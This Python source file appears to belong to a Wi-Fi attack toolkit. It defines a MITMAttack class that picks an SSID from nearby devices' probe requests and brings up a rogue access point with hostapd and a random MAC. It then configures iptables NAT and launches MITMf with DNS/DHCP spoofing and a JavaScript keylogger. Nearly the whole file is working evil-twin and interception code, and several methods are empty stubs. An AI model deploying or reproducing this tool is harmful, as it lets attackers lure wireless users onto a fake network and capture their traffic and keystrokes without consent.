import logging
import threading
import subprocess
from datetime import datetime
from tempfile import NamedTemporaryFile
from time import sleep
from wifi_tools import redis_server
from wifi_tools.attack import CustomAttack
from wifi_tools.utils import random_mac_address
from wifi_tools.settings import HOSTAPD_LOG, MITMF_LOG

logger = logging.getLogger(__name__)


class MITMAttack:

    def __init__(self, redis_server, iface, essid=None):
        self.redis_server = redis_server
        interfaces = self.redis_server.lrange('interfaces', 0, -1)
        self.iface = iface
        if len(interfaces) == 1:
            self.select_from_total_probe_requests()
        else:
            logger.info('Waiting for probe requests')
            self.probes_thread = threading.Thread(target=self._poll_probes)
            self.probes_thread.start()

    def select_from_total_probe_requests(self):
        # since we have one interface we will use global recolected
        # probe requests
        logger.info('One interface found, using total probe_requests list')
        essids = self.redis_server.zrange('probe_requests', 0, 10, desc=True)
        client_data = essids.pop()
        self.essid = client_data
        self.mac = random_mac_address()
        self.start_ap()

    def start_ap(self):
        logger.info('Starting ap with essid {0} and mac {1}'.format(self.essid, self.mac))
        redis_server.sadd('bssid_white_list', self.mac)
        command = ['ifconfig', self.iface, 'down']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        self.start_access_point()
        self.leases_parser_stop = False
        self.p = None

    def _poll_probes(self):
        current_probes = self.redis_server.zcount('session_probe_requests','-inf', '+inf')
        start = datetime.now()
        delta = 0
        timeout_threshold = 20
        while current_probes < 3 and delta < timeout_threshold:
            delta = (datetime.now() - start).seconds
            logger.info('Current probe request found {0}'.format(current_probes))
            logger.info('Delta time {0}'.format(delta))
            current_probes = self.redis_server.zcount('session_probe_requests','-inf', '+inf')
            sleep(0.5)
        if delta < timeout_threshold:
            essids = self.redis_server.zrange('session_probe_requests', 0, 10, desc=True)
            self.essid = essids.pop()
            self.mac = random_mac_address()
            logger.info('ESSID to be used is {0}'.format(self.essid))
            self.start_ap()
        else:
            logger.info('Waiting for near probe request timeout. selecting from collected data.')
            self.select_from_total_probe_requests()

    def start(self):
        pass

    def terminate(self):
        pass

    def is_alive(self):
        return self.p.poll() is None

    def stop(self):
        self.leases_parser_stop = True
        if self.p:

            self.kill()

    def generate_hostapd_config(self):
        temp_file = NamedTemporaryFile(delete=False)
        res = 'interface={0}\n'.format(self.iface)
        res += 'driver=nl80211\n'
        res += 'ssid={0}\n'.format(self.essid.decode('ascii'))
        res += 'channel=11\n'
        temp_file.write(res.encode('ascii'))
        temp_file.flush()
        return temp_file

    def start_access_point(self):
        hostapd_conf_file = self.generate_hostapd_config()
        hostapd_conf_file.seek(0)
        command = ['hostapd', hostapd_conf_file.name]
        self.p = subprocess.Popen(command, stdout=subprocess.PIPE)
        self.configure_network()


    def terminate(self):
        self.stop()

    def configure_network(self):
        logger.info('Configuring network')
        command = ['ifconfig', self.iface, 'down']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        command = ['ifconfig', self.iface, 'up']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        command = ['ifconfig', self.iface, '192.168.2.1', 'netmask', '255.255.255.0']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        command = ['iptables', '--flush']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        command = ['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        command = ['/usr/bin/python', '/home/pi/MITMf/mitmf.py', '--spoof', '--dns', '--dhcp', '--gateway', '192.168.2.1', '--jskeylogger', '-i', self.iface]
        file_std = open(MITMF_LOG + 'std', 'a')
        file_err = open(MITMF_LOG + 'err', 'a')
        self.mitmf = subprocess.Popen(command, stdout=file_std, stderr=file_err, cwd='/home/pi/MITMf')
        self.t2 = threading.Thread(target=self._parse_mitmf)
        self.t2.start()

    def _parse_mitmf(self):
        pass
